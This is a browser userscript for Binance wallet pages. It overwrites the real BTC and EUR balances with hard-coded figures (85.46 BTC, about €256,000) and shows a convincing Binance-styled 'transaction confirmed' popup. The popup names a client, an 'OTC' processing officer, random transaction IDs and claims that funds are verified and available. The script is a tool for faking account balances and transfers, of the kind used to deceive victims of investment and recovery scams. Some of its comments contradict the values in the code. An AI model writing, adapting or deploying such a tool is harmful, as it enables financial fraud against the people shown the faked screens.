// ==UserScript==
// @name         Binance Balance Updater
// @namespace    http://tampermonkey.net/
// @version      7.0
// @description  Update BTC and EUR balance values with congratulatory notification
// @author       You
// @match        https://www.binance.com/en/my/wallet/account/main
// @match        https://www.binance.com/en/my/wallet/account/overview
// @match        https://www.binance.com/en/my/dashboard
// @grant        GM_xmlhttpRequest
// @connect      api.binance.com
// @updateURL    https://raw.githubusercontent.com/enterakont-star/binance-scripts/main/binance-balance-updater.user.js
// @downloadURL  https://raw.githubusercontent.com/enterakont-star/binance-scripts/main/binance-balance-updater.user.js
// ==/UserScript==

(function() {
    'use strict';

    // Check if current URL matches allowed pages
    const currentUrl = window.location.href;
    const allowedUrls = [
        'https://www.binance.com/en/my/wallet/account/main',
        'https://www.binance.com/en/my/wallet/account/overview',
        'https://www.binance.com/en/my/dashboard'
    ];

    // Allow for URL parameters
    const isAllowedPage = allowedUrls.some(url => currentUrl.startsWith(url));

    if (!isAllowedPage) {
        console.log('🚫 Skript nicht für diese Seite aktiviert');
        return;
    }

    console.log(`✅ Skript aktiv für: ${currentUrl}`);

    // UPDATED VALUES as requested
    const fixedBTCAmount = 85.46234523;         // UPDATED: Changed to 1.46234523 BTC
    const fixedEURAmount = 256456.72;          // UPDATED: Changed to €119.436,72
    const clientName = "Günter Fisch";         // UPDATED: Changed to Günter Fisch
    const transactionDate = "17 January 2026"; // UPDATED: Transaction date
    const processedBy = "Jonas Baumann";       // UPDATED: Processed by
    const department = "OTC Finanzabteilung";  // UPDATED: Department

    // Check if we should show popup (only on overview page)
    const showPopup = currentUrl.includes('/overview');
    console.log(`📊 Popup anzeigen: ${showPopup ? 'Ja' : 'Nein'}`);

    // Store BTC price globally
    let currentBTCPrice = 73000; // Fallback price

    // Function to get real BTC price (kept for reference but not used for fixed amounts)
    function getRealBTCPrice() {
        return new Promise((resolve) => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: 'https://api.binance.com/api/v3/ticker/price?symbol=BTCEUR',
                timeout: 5000,
                onload: function(response) {
                    if (response.status === 200) {
                        try {
                            const data = JSON.parse(response.responseText);
                            const price = parseFloat(data.price);
                            if (price && price > 0) {
                                currentBTCPrice = price;
                                console.log('✅ BTC/EUR Preis: €' + price.toLocaleString('de-DE'));
                                resolve(price);
                            } else {
                                resolve(currentBTCPrice);
                            }
                        } catch (error) {
                            console.log('❌ Fehler beim Parsen des Preises:', error);
                            resolve(currentBTCPrice);
                        }
                    } else {
                        console.log('❌ API Fehler, verwende Standardpreis');
                        resolve(currentBTCPrice);
                    }
                },
                ontimeout: function() {
                    console.log('❌ Preisabruf Zeitüberschreitung, verwende Standardpreis');
                    resolve(currentBTCPrice);
                },
                onerror: function() {
                    console.log('❌ Netzwerkfehler, verwende Standardpreis');
                    resolve(currentBTCPrice);
                }
            });
        });
    }

    // Format currency in German style
    function formatCurrency(amount) {
        return parseFloat(amount).toLocaleString('de-DE', {
            style: 'currency',
            currency: 'EUR',
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Track if notification was already shown
    let notificationShown = false;

    function showBinanceNotification() {
        if (!showPopup || notificationShown) return;
        notificationShown = true;

        console.log('🔄 Erstelle Benachrichtigung für Overview-Seite');

        // Create overlay
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 999999;
            font-family: 'Mona Sans', -apple-system, BlinkMacSystemFont, sans-serif;
            backdrop-filter: blur(4px);
        `;

        // Create WIDER notification box with two-column layout
        const notification = document.createElement('div');
        notification.style.cssText = `
            background: #0F1114;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(240, 185, 11, 0.3);
            max-width: 800px;
            width: 90%;
            color: #EAECEF;
            animation: slideIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative;
            border: 2px solid #2B3139;
            overflow: hidden;
        `;

        // Add CSS animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes slideIn {
                from { transform: translateY(20px) scale(0.95); opacity: 0; }
                to { transform: translateY(0) scale(1); opacity: 1; }
            }
            @keyframes pulse {
                0% { transform: scale(1); }
                50% { transform: scale(1.05); }
                100% { transform: scale(1); }
            }
            @keyframes fadeOut {
                from { opacity: 1; transform: scale(1); }
                to { opacity: 0; transform: scale(0.95); }
            }
        `;
        document.head.appendChild(style);

        // Add golden border accent
        const borderAccent = document.createElement('div');
        borderAccent.style.cssText = `
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #F0B90B 0%, #F8D33A 50%, #F0B90B 100%);
            z-index: 1;
        `;

        // Create two-column container
        const columnsContainer = document.createElement('div');
        columnsContainer.style.cssText = `
            display: flex;
            gap: 30px;
            margin-bottom: 30px;
        `;

        // LEFT COLUMN - Transaction Details
        const leftColumn = document.createElement('div');
        leftColumn.style.cssText = `
            flex: 1;
            display: flex;
            flex-direction: column;
        `;

        // Header section
        const headerSection = document.createElement('div');
        headerSection.style.cssText = `
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
        `;

        const icon = document.createElement('div');
        icon.style.cssText = `
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #F0B90B 0%, #F8D33A 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #0F1114;
            font-size: 30px;
            font-weight: bold;
            border: 2px solid #2B3139;
            box-shadow: 0 6px 20px rgba(240, 185, 11, 0.4);
            animation: pulse 2s infinite;
        `;
        icon.innerHTML = '🎉';

        const titleSection = document.createElement('div');

        const title = document.createElement('div');
        title.style.cssText = `
            font-size: 24px;
            font-weight: 800;
            color: #F0B90B;
            margin-bottom: 5px;
            letter-spacing: 0.5px;
        `;
        title.textContent = 'Transaktion Bestätigt!';

        const greeting = document.createElement('div');
        greeting.style.cssText = `
            font-size: 18px;
            color: #EAECEF;
            font-weight: 600;
        `;
        greeting.textContent = clientName;

        titleSection.appendChild(title);
        titleSection.appendChild(greeting);
        headerSection.appendChild(icon);
        headerSection.appendChild(titleSection);

        // Transaction Details Card
        const transactionCard = document.createElement('div');
        transactionCard.style.cssText = `
            background: linear-gradient(145deg, #1A1D23 0%, #2B3139 100%);
            border-radius: 16px;
            padding: 25px;
            border: 1px solid #474D57;
            flex-grow: 1;
        `;

        const transactionTitle = document.createElement('div');
        transactionTitle.style.cssText = `
            font-size: 14px;
            color: #848E9C;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
        `;
        transactionTitle.innerHTML = `
            <span style="font-size: 16px;">📋</span>
            <span>Transaktionsdetails</span>
        `;

        // Transaction Info Items
        const transactionInfo = `
            <div style="margin-bottom: 20px;">
                <div style="font-size: 12px; color: #848E9C; margin-bottom: 5px; text-transform: uppercase;">Transaktions-ID</div>
                <div style="font-size: 14px; color: #EAECEF; font-family: monospace; background: rgba(43, 49, 57, 0.5); padding: 8px 12px; border-radius: 8px; border: 1px solid #474D57;">BNC-2026-${Math.random().toString(36).substr(2, 8).toUpperCase()}</div>
            </div>

            <div style="margin-bottom: 20px;">
                <div style="font-size: 12px; color: #848E9C; margin-bottom: 5px; text-transform: uppercase;">Datum & Uhrzeit</div>
                <div style="font-size: 16px; color: #EAECEF; font-weight: 600;">${transactionDate}, 14:32 CET</div>
            </div>

            <div style="margin-bottom: 20px;">
                <div style="font-size: 12px; color: #848E9C; margin-bottom: 5px; text-transform: uppercase;">Status</div>
                <div style="display: flex; align-items: center; gap: 8px;">
                    <span style="width: 10px; height: 10px; background: #10B981; border-radius: 50%;"></span>
                    <span style="font-size: 16px; color: #10B981; font-weight: 600;">Erfolgreich abgeschlossen</span>
                </div>
            </div>

            <div style="margin-bottom: 20px;">
                <div style="font-size: 12px; color: #848E9C; margin-bottom: 5px; text-transform: uppercase;">Verarbeitet durch</div>
                <div style="font-size: 16px; color: #EAECEF; font-weight: 600;">${processedBy}</div>
                <div style="font-size: 13px; color: #848E9C; margin-top: 2px;">${department}</div>
            </div>

            <div>
                <div style="font-size: 12px; color: #848E9C; margin-bottom: 5px; text-transform: uppercase;">Referenz</div>
                <div style="font-size: 13px; color: #B7BDC6;">OTC-Brokerage #${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}</div>
            </div>
        `;

        transactionCard.appendChild(transactionTitle);
        transactionCard.innerHTML += transactionInfo;

        // Assemble left column
        leftColumn.appendChild(headerSection);
        leftColumn.appendChild(transactionCard);

        // RIGHT COLUMN - Balance Information
        const rightColumn = document.createElement('div');
        rightColumn.style.cssText = `
            flex: 1;
            display: flex;
            flex-direction: column;
        `;

        // Balance Card
        const balanceCard = document.createElement('div');
        balanceCard.style.cssText = `
            background: linear-gradient(145deg, #1A1D23 0%, #2B3139 100%);
            border-radius: 16px;
            padding: 25px;
            border: 1px solid #474D57;
            flex-grow: 1;
        `;

        const balanceTitle = document.createElement('div');
        balanceTitle.style.cssText = `
            font-size: 14px;
            color: #848E9C;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 8px;
        `;
        balanceTitle.innerHTML = `
            <span style="font-size: 16px;">💰</span>
            <span>Aktualisierte Bilanz</span>
        `;

        // BTC Balance
        const btcSection = document.createElement('div');
        btcSection.style.cssText = `
            margin-bottom: 25px;
        `;

        const btcLabel = document.createElement('div');
        btcLabel.style.cssText = `
            font-size: 13px;
            color: #848E9C;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        `;
        btcLabel.textContent = 'Bitcoin Vermögen';

        const btcAmount = document.createElement('div');
        btcAmount.style.cssText = `
            font-size: 32px;
            font-weight: 800;
            color: #F0B90B;
            line-height: 1.2;
            margin-bottom: 5px;
        `;
        btcAmount.textContent = `${fixedBTCAmount} BTC`;

        const btcValue = document.createElement('div');
        btcValue.style.cssText = `
            font-size: 14px;
            color: #B7BDC6;
        `;
        btcValue.textContent = `≈ ${formatCurrency(fixedEURAmount)}`;

        btcSection.appendChild(btcLabel);
        btcSection.appendChild(btcAmount);
        btcSection.appendChild(btcValue);

        // EUR Balance
        const eurSection = document.createElement('div');
        eurSection.style.cssText = `
            margin-bottom: 30px;
        `;

        const eurLabel = document.createElement('div');
        eurLabel.style.cssText = `
            font-size: 13px;
            color: #848E9C;
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        `;
        eurLabel.textContent = 'Euro Gegenwert';

        const eurAmount = document.createElement('div');
        eurAmount.style.cssText = `
            font-size: 28px;
            font-weight: 800;
            color: #EAECEF;
            line-height: 1.2;
        `;
        eurAmount.textContent = formatCurrency(fixedEURAmount);

        eurSection.appendChild(eurLabel);
        eurSection.appendChild(eurAmount);

        // Success Message
        const successMessage = document.createElement('div');
        successMessage.style.cssText = `
            background: rgba(16, 185, 129, 0.1);
            border-radius: 12px;
            padding: 20px;
            border: 1px solid rgba(16, 185, 129, 0.2);
            margin-top: 20px;
        `;

        const successHeader = document.createElement('div');
        successHeader.style.cssText = `
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 10px;
        `;
        successHeader.innerHTML = `
            <span style="font-size: 20px; color: #10B981;">✅</span>
            <span style="font-size: 15px; color: #10B981; font-weight: 600;">Transaktion verifiziert</span>
        `;

        const successDetails = document.createElement('div');
        successDetails.style.cssText = `
            font-size: 13px;
            color: #B7BDC6;
            line-height: 1.5;
        `;
        successDetails.innerHTML = `
            <div style="margin-bottom: 5px;">• Blockchain-Bestätigungen erhalten</div>
            <div style="margin-bottom: 5px;">• Sicherheitsprüfung abgeschlossen</div>
            <div>• Fonds sind jetzt verfügbar</div>
        `;

        successMessage.appendChild(successHeader);
        successMessage.appendChild(successDetails);

        // Assemble balance card
        balanceCard.appendChild(balanceTitle);
        balanceCard.appendChild(btcSection);
        balanceCard.appendChild(eurSection);
        balanceCard.appendChild(successMessage);

        rightColumn.appendChild(balanceCard);

        // Add columns to container
        columnsContainer.appendChild(leftColumn);
        columnsContainer.appendChild(rightColumn);

        // Footer with Action Button
        const footer = document.createElement('div');
        footer.style.cssText = `
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 10px;
        `;

        const viewDetailsButton = document.createElement('button');
        viewDetailsButton.style.cssText = `
            background: rgba(43, 49, 57, 0.8);
            color: #EAECEF;
            border: 1px solid #474D57;
            padding: 14px 30px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            flex: 1;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        `;
        viewDetailsButton.textContent = 'Details anzeigen';

        const confirmButton = document.createElement('button');
        confirmButton.style.cssText = `
            background: linear-gradient(135deg, #F0B90B 0%, #F8D33A 100%);
            color: #0F1114;
            border: none;
            padding: 14px 30px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 800;
            cursor: pointer;
            flex: 1;
            transition: all 0.2s ease;
            text-transform: uppercase;
            letter-spacing: 0.8px;
            box-shadow: 0 4px 15px rgba(240, 185, 11, 0.4);
        `;
        confirmButton.textContent = 'Bestätigen';

        // Hover effects
        viewDetailsButton.onmouseover = () => {
            viewDetailsButton.style.background = '#2B3139';
            viewDetailsButton.style.transform = 'translateY(-2px)';
        };
        viewDetailsButton.onmouseout = () => {
            viewDetailsButton.style.background = 'rgba(43, 49, 57, 0.8)';
            viewDetailsButton.style.transform = 'translateY(0)';
        };

        confirmButton.onmouseover = () => {
            confirmButton.style.transform = 'translateY(-2px)';
            confirmButton.style.boxShadow = '0 6px 20px rgba(240, 185, 11, 0.5)';
        };
        confirmButton.onmouseout = () => {
            confirmButton.style.transform = 'translateY(0)';
            confirmButton.style.boxShadow = '0 4px 15px rgba(240, 185, 11, 0.4)';
        };

        // Button actions
        viewDetailsButton.onclick = () => {
            viewDetailsButton.innerHTML = '<span style="color: #10B981;">✓ Details geladen</span>';
            viewDetailsButton.style.background = 'linear-gradient(135deg, #10B981 0%, #34D399 100%)';
            viewDetailsButton.style.borderColor = 'transparent';
            viewDetailsButton.style.color = '#0F1114';
        };

        confirmButton.onclick = () => {
            if (document.body.contains(overlay)) {
                overlay.style.animation = 'fadeOut 0.2s ease-out forwards';
                confirmButton.disabled = true;
                confirmButton.innerHTML = '<span style="color: #10B981;">✓ Geschlossen</span>';
                confirmButton.style.background = 'linear-gradient(135deg, #10B981 0%, #34D399 100%)';

                setTimeout(() => {
                    if (document.body.contains(overlay)) {
                        document.body.removeChild(overlay);
                        if (document.head.contains(style)) {
                            document.head.removeChild(style);
                        }
                    }
                }, 200);
            }
        };

        footer.appendChild(viewDetailsButton);
        footer.appendChild(confirmButton);

        // Close button (X)
        const closeButton = document.createElement('button');
        closeButton.style.cssText = `
            position: absolute;
            top: 20px;
            right: 20px;
            width: 32px;
            height: 32px;
            background: rgba(43, 49, 57, 0.9);
            border: 1.5px solid #474D57;
            border-radius: 50%;
            color: #B7BDC6;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s ease;
            z-index: 2;
        `;
        closeButton.innerHTML = '×';
        closeButton.onmouseover = () => {
            closeButton.style.background = 'rgba(239, 68, 68, 0.9)';
            closeButton.style.color = 'white';
            closeButton.style.borderColor = 'rgba(239, 68, 68, 0.5)';
            closeButton.style.transform = 'scale(1.1)';
        };
        closeButton.onmouseout = () => {
            closeButton.style.background = 'rgba(43, 49, 57, 0.9)';
            closeButton.style.color = '#B7BDC6';
            closeButton.style.borderColor = '#474D57';
            closeButton.style.transform = 'scale(1)';
        };
        closeButton.onclick = () => {
            if (document.body.contains(overlay)) {
                overlay.style.animation = 'fadeOut 0.2s ease-out forwards';
                setTimeout(() => {
                    if (document.body.contains(overlay)) {
                        document.body.removeChild(overlay);
                        if (document.head.contains(style)) {
                            document.head.removeChild(style);
                        }
                    }
                }, 200);
            }
        };

        // Assemble the notification
        notification.appendChild(borderAccent);
        notification.appendChild(closeButton);
        notification.appendChild(columnsContainer);
        notification.appendChild(footer);
        overlay.appendChild(notification);

        // Add to page
        document.body.appendChild(overlay);
        console.log('✅ Benachrichtigung angezeigt');
    }

    function updateAllBalances() {
        try {
            console.log('🔍 Suche nach Balance-Elementen...');

            // Page-specific selectors for each allowed page
            let btcSelectors = [];
            let eurSelectors = [];

            // Common selectors across all pages
            const commonBtcSelectors = [
                '.typography-Headline4',
                '.css-1ej4h1',
                '.balance-amount',
                '[data-bn-type="text"]',
                '.asset-balance',
                '.total-balance',
                '.wallet-balance',
                '.amount',
                '.value',
                '.total-amount',
                '[class*="balance"]',
                '[class*="amount"]',
                '[class*="value"]'
            ];

            const commonEurSelectors = [
                '.body3.mt-2',
                '.css-1x8w2l5',
                '.balance-value',
                '.currency-amount',
                '.eur-balance',
                '.fiat-balance',
                '.converted-amount',
                '.equivalent',
                '.sub-amount',
                '.secondary-amount'
            ];

            // Add page-specific selectors
            if (currentUrl.includes('/overview')) {
                btcSelectors = [
                    ...commonBtcSelectors,
                    '.css-1qa1q3p', // Overview page specific
                    '.total-assets-value'
                ];
                eurSelectors = [
                    ...commonEurSelectors,
                    '.estimated-value'
                ];
            } else if (currentUrl.includes('/main')) {
                btcSelectors = [
                    ...commonBtcSelectors,
                    '.account-balance',
                    '.main-balance'
                ];
                eurSelectors = [
                    ...commonEurSelectors,
                    '.account-value'
                ];
            } else if (currentUrl.includes('/dashboard')) {
                btcSelectors = [
                    ...commonBtcSelectors,
                    '.dashboard-balance',
                    '.portfolio-value'
                ];
                eurSelectors = [
                    ...commonEurSelectors,
                    '.dashboard-value'
                ];
            } else {
                btcSelectors = commonBtcSelectors;
                eurSelectors = commonEurSelectors;
            }

            // BTC Balance Update
            let btcUpdated = false;
            for (const selector of btcSelectors) {
                const elements = document.querySelectorAll(selector);
                for (const element of elements) {
                    if (element.textContent && /[\d.,]+\s*BTC/i.test(element.textContent)) {
                        // Keep the original text structure but update the number
                        const newText = element.textContent.replace(/[\d.,]+(?=\s*BTC)/i, fixedBTCAmount);
                        element.textContent = newText;
                        console.log(`✅ BTC Wert aktualisiert auf ${fixedBTCAmount} BTC (Selector: ${selector})`);
                        btcUpdated = true;
                    }
                    // Also check for BTC without currency label
                    else if (element.textContent && /^[\d.,]+\s*$/.test(element.textContent.trim()) &&
                             element.nextElementSibling &&
                             element.nextElementSibling.textContent &&
                             /BTC/i.test(element.nextElementSibling.textContent)) {
                        element.textContent = fixedBTCAmount.toString();
                        console.log(`✅ BTC Wert aktualisiert auf ${fixedBTCAmount} BTC (implicit)`);
                        btcUpdated = true;
                    }
                }
            }

            // EUR Balance Update
            let eurUpdated = false;
            const eurValue = formatCurrency(fixedEURAmount);
            for (const selector of eurSelectors) {
                const elements = document.querySelectorAll(selector);
                for (const element of elements) {
                    if (element.textContent && /€[\d.,]+|EUR[\s]*[\d.,]+/i.test(element.textContent)) {
                        // Keep the original text structure but update the number
                        const newText = element.textContent.replace(/[€EUR\s]*([\d.,]+)/i, eurValue);
                        element.textContent = newText;
                        console.log(`✅ EUR Wert aktualisiert auf: ${eurValue} (Selector: ${selector})`);
                        eurUpdated = true;
                    }
                    // Also check for pure numbers that might be EUR amounts
                    else if (element.textContent && /^[\d.,]+\s*$/.test(element.textContent.trim()) &&
                             element.previousElementSibling &&
                             element.previousElementSibling.textContent &&
                             /€|EUR/i.test(element.previousElementSibling.textContent)) {
                        element.textContent = fixedEURAmount.toLocaleString('de-DE', {minimumFractionDigits: 2, maximumFractionDigits: 2});
                        console.log(`✅ EUR Wert aktualisiert auf: ${fixedEURAmount.toLocaleString('de-DE')} (implicit)`);
                        eurUpdated = true;
                    }
                }
            }

            // Check for specific Binance wallet balance containers
            const walletContainers = document.querySelectorAll('.css-11u8o5u, .css-1c8c51n, .wallet-card, .balance-card, .asset-card');
            walletContainers.forEach(container => {
                const btcElements = container.querySelectorAll('div, span');
                btcElements.forEach(el => {
                    if (el.textContent && /[\d.,]+\s*BTC/i.test(el.textContent)) {
                        const newText = el.textContent.replace(/[\d.,]+(?=\s*BTC)/i, fixedBTCAmount);
                        el.textContent = newText;
                        console.log(`✅ BTC Wert in Wallet Container aktualisiert`);
                    }
                    if (el.textContent && /€[\d.,]+/i.test(el.textContent)) {
                        const newText = el.textContent.replace(/[€\s]*([\d.,]+)/i, eurValue);
                        el.textContent = newText;
                        console.log(`✅ EUR Wert in Wallet Container aktualisiert`);
                    }
                });
            });

            // If we found and updated balances, show a console message
            if (btcUpdated || eurUpdated) {
                console.log(`🎯 Balances erfolgreich aktualisiert: BTC=${fixedBTCAmount}, EUR=${eurValue}`);
                return true;
            }

            // Fallback: Look for any element with balance-like text
            if (!btcUpdated && !eurUpdated) {
                console.log('🔍 Erweiterte Suche nach Balance-Text...');
                const allTextElements = document.querySelectorAll('div, span, p, h1, h2, h3, h4, h5, h6');
                allTextElements.forEach(el => {
                    const text = el.textContent;
                    if (text) {
                        // BTC pattern
                        if (/(\d+[\d.,]*)\s*BTC/i.test(text)) {
                            const match = text.match(/(\d+[\d.,]*)\s*BTC/i);
                            if (match) {
                                el.textContent = text.replace(match[1], fixedBTCAmount);
                                console.log(`✅ BTC Wert im Text gefunden: ${match[1]} → ${fixedBTCAmount}`);
                                btcUpdated = true;
                            }
                        }
                        // EUR pattern
                        if (/€\s*(\d+[\d.,]*)/i.test(text)) {
                            const match = text.match(/€\s*(\d+[\d.,]*)/i);
                            if (match) {
                                el.textContent = text.replace(match[1], fixedEURAmount.toLocaleString('de-DE'));
                                console.log(`✅ EUR Wert im Text gefunden: ${match[1]} → ${fixedEURAmount.toLocaleString('de-DE')}`);
                                eurUpdated = true;
                            }
                        }
                    }
                });
            }

            return btcUpdated || eurUpdated;

        } catch (error) {
            console.log('❌ Fehler in updateAllBalances:', error);
            return false;
        }
    }

    // Enhanced function to scan and update the entire page
    function scanAndUpdatePage() {
        console.log(`🔄 Scanne ${currentUrl} nach Balance-Elementen...`);

        // Try to update balances
        const updated = updateAllBalances();

        if (updated) {
            console.log(`✅ ${currentUrl} erfolgreich aktualisiert`);
        } else {
            console.log(`⚠️ Keine Balance-Elemente auf ${currentUrl} gefunden`);
        }

        return updated;
    }

    // Sichere Initialisierung
    async function init() {
        try {
            console.log('🚀 Starte Binance Balance Updater...');
            console.log(`📌 Aktuelle Seite: ${currentUrl}`);
            console.log('📊 Zielwerte:');
            console.log(`   BTC: ${fixedBTCAmount}`);
            console.log(`   EUR: ${formatCurrency(fixedEURAmount)}`);
            console.log(`   Kunde: ${clientName}`);
            console.log(`   Popup: ${showPopup ? 'Wird angezeigt' : 'Nur Balance-Update'}`);

            // Get BTC price for reference (optional)
            await getRealBTCPrice();

            // Initial update attempts
            setTimeout(() => scanAndUpdatePage(), 1000);
            setTimeout(() => scanAndUpdatePage(), 2000);
            setTimeout(() => scanAndUpdatePage(), 3000);

            // Show notification only on overview page
            if (showPopup) {
                setTimeout(showBinanceNotification, 4000);
            }

            // Additional attempts after page fully loads
            setTimeout(() => scanAndUpdatePage(), 5000);

        } catch (error) {
            console.log('❌ Skript Initialisierungsfehler:', error);
        }
    }

    // Enhanced Mutation Observer
    let observerAttempts = 0;
    const maxObserverAttempts = 8;

    const observer = new MutationObserver(function(mutations) {
        if (observerAttempts < maxObserverAttempts) {
            observerAttempts++;

            // Check if new content was added
            let shouldUpdate = false;
            mutations.forEach(mutation => {
                if (mutation.addedNodes.length > 0) {
                    shouldUpdate = true;
                }
            });

            if (shouldUpdate) {
                console.log(`👀 Mutation erkannt, Versuch #${observerAttempts}`);
                setTimeout(() => scanAndUpdatePage(), 500);
            }
        } else if (observerAttempts === maxObserverAttempts) {
            console.log('⏹️ Mutation Observer beendet (maximale Versuche erreicht)');
        }
    });

    // Start script
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

    // Start observer after a delay to catch dynamic content
    setTimeout(() => {
        try {
            observer.observe(document.body, {
                childList: true,
                subtree: true,
                characterData: false,
                attributes: false
            });
            console.log('👀 Mutation Observer gestartet');
        } catch (error) {
            console.log('❌ Observer Fehler:', error);
        }
    }, 2000);

    // Listen for SPA route changes within allowed pages
    let lastUrl = location.href;
    setInterval(() => {
        const newUrl = location.href;
        if (lastUrl !== newUrl) {
            const isNewUrlAllowed = allowedUrls.some(url => newUrl.startsWith(url));

            if (isNewUrlAllowed) {
                console.log(`🔄 Navigation erkannt: ${lastUrl} → ${newUrl}`);
                lastUrl = newUrl;
                observerAttempts = 0; // Reset observer attempts for new page

                // Update current page context
                const newShowPopup = newUrl.includes('/overview');
                if (newShowPopup !== showPopup) {
                    console.log(`📊 Popup-Status geändert: ${newShowPopup ? 'Wird angezeigt' : 'Nur Balance-Update'}`);
                }

                setTimeout(() => scanAndUpdatePage(), 1000);
                setTimeout(() => scanAndUpdatePage(), 2500);
            }
        }
    }, 1000);

})();
